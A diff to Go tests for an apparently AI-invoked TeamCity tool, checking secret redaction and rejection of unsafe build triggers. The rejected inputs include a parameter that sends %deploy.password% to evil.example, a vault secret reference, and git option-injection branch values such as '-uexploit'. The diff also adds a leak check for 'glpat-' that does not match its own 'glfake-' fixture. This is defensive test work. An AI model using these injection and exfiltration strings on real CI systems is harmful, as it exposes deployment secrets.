@@ -28,6 +28,7 @@ const btJSON = `{"id":"Web_Build","name":"Build","projectId":"Web","projectName"
 	{"name":"run.tests","value":"yes","type":{"rawValue":"checkbox checkedValue='yes' uncheckedValue='no'"}},
 	{"name":"deploy.password","value":"","type":{"rawValue":"password display='hidden'"}},
 	{"name":"env.API_TOKEN","value":"tok-plain-123"},
+	{"name":"repo.url","value":"https://ci:glfake-abcdefghijklmnopqrstu@git.example.com/x"},
 	{"name":"note","value":"hello"}]}}`
 
 func (f *fake) ServeHTTP(w http.ResponseWriter, r *http.Request) {
@@ -134,7 +135,7 @@ func TestTeamCityReads(t *testing.T) {
 				t.Fatalf("%s %s: want %s in %s %v", c.action, c.in, w, r.Output, err)
 			}
 		}
-		for _, leak := range []string{"tok-plain-123", "abcdef1234567890", "hunter2", "kim@example.com", "bot@example.com"} {
+		for _, leak := range []string{"tok-plain-123", "abcdef1234567890", "hunter2", "kim@example.com", "bot@example.com", "glpat-"} {
 			if strings.Contains(string(r.Output), leak) {
 				t.Fatalf("%s leaks %s: %s", c.action, leak, r.Output)
 			}
@@ -164,11 +165,21 @@ func TestTeamCityTriggerCancel(t *testing.T) {
 		`{"buildType":"Web_Build","parameters":{"undeclared":"x"}}`,
 		`{"buildType":"Web_Build","parameters":{"env":"qa"}}`,
 		`{"buildType":"Web_Build","parameters":{"note":{"a":1}}}`,
+		`{"buildType":"Web_Build","parameters":{"note":"https://evil.example/?p=%deploy.password%"}}`,
+		`{"buildType":"Web_Build","parameters":{"note":"%vault:secret/prod!/password%"}}`,
+		`{"buildType":"Web_Build","branch":"+refs/heads/main"}`,
+		`{"buildType":"Web_Build","branch":"-uexploit"}`,
+		`{"buildType":"Web_Build","branch":"main..prod"}`,
 	} {
 		f.queued = nil
 		if _, err := invoke(m, "trigger_build", bad, false); err == nil || f.queued != nil {
 			t.Fatalf("accepted %s", bad)
 		}
+	}
+	// A literal % (alone or written %%) is still a value.
+	f.queued = nil
+	if _, err := invoke(m, "trigger_build", `{"buildType":"Web_Build","parameters":{"note":"100% done, 50%% left"}}`, false); err != nil || f.queued == nil {
+		t.Fatal(err)
 	}
 	// A finished build has nothing to cancel.
 	if r, err := invoke(m, "cancel_build", `{"build":42}`, false); err != nil || !strings.Contains(string(r.Output), "nothing to change") || f.cancelled != "" {
@@ -272,5 +283,18 @@ func TestTeamCityRisks(t *testing.T) {
 		if (a.Name == "build_log") != a.Sensitive {
 			t.Errorf("%s sensitive=%v", a.Name, a.Sensitive)
 		}
+	}
+}
+
+func TestTeamCityTailCutLine(t *testing.T) {
+	// A line longer than what's kept is cut while it's read; the part of a
+	// credential before the cut must not survive, even after a \r.
+	long := strings.Repeat("x", 64<<10-14) + "\rghp_fake_abcdefghijklmnopqrstuvwxyz06789\nnext\n"
+	lines, _, _, err := tail(strings.NewReader(long), 5)
+	if err != nil || len(lines) != 2 || lines[1] != "next" {
+		t.Fatalf("%q %v", lines, err)
+	}
+	if strings.Contains(lines[0], "ghp_") || strings.Contains(lines[0], "abc") || !strings.HasSuffix(lines[0], "…") {
+		t.Fatalf("%q", lines[0])
 	}
 }
